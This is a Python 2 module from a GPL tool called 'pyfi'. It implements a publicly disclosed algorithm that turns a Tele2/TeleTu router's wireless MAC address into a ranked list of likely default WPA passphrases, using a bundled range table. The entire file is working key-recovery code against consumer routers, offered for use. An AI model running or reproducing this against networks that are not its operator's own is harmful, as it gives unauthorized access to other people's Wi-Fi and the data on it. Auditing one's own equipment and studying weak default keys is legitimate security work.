# pyfi
# Copyright (C) 2012  simock85
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

from algorithms.algorithm import WpaAlgorithm, WpaNotFound
from lib.helpers import cached_property
import os
import re

class Tele2(WpaAlgorithm):
    """Tele2 - TeleTu algorithm
    based on swsooue and Deinde disclosure
    """

    alg_name = 'tele2'

    @cached_property
    def config_re(self):
        return re.compile('^([0-9A-F]{6})\s+([0-9A-F]{6})\s+([0-9A-F]{6})\s+([0-9]{5})\s+([0-9A-F]{6})', re.MULTILINE)

    @cached_property
    def parsed_config(self):
        with open(os.path.join(os.path.dirname(__file__),'Tele2.txt')) as txt:
            no_colon_txt = txt.read().replace(':', '')
            matches = re.findall(self.config_re, no_colon_txt)
            config_dict = {}
            for match in matches:
                substruct = dict(start=match[1], end=match[2], sn1=match[3], base=match[4])
                if match[0] in config_dict:
                    config_dict[match[0]].append(substruct)
                else:
                    config_dict[match[0]]=[substruct, ]
        return config_dict

    def compute_probability(self, position, start, end):
        if start <= position <= end:
            return 1.0
        delta = float(int(end, 16)-int(start, 16))
        if start > position:
            return delta/(int(end, 16)-int(position, 16))
        return delta/(int(position, 16)-int(end, 16))

    def find_wpas(self, wmac):
        def build_wpa_string(sub):
            return ''.join([sub['sn1'],'Y','%0*d'%(7, (int(wmac[6:],16)-int(sub['base'],16))/2)])
        struct = self.parsed_config.get(wmac[:6])
        if struct is None:
            raise WpaNotFound('wmac not in range')
        positions = []
        for substruct in struct:
            if wmac[6:] > substruct['base']:
                positions.append(dict(
                    wpa=build_wpa_string(substruct),
                    probability=self.compute_probability(wmac[6:], substruct['start'], substruct['end'])))
        return sorted(positions, key=lambda sub: sub['probability'], reverse=True)

    def run(self, network):
        try:
            strings = ["wpa: %s probability:%f" % (w['wpa'], w['probability']) for w in self.find_wpas(network.wmac.replace(':', ''))]
            return '\n'.join(strings)
        except WpaNotFound, err:
            return err.msg

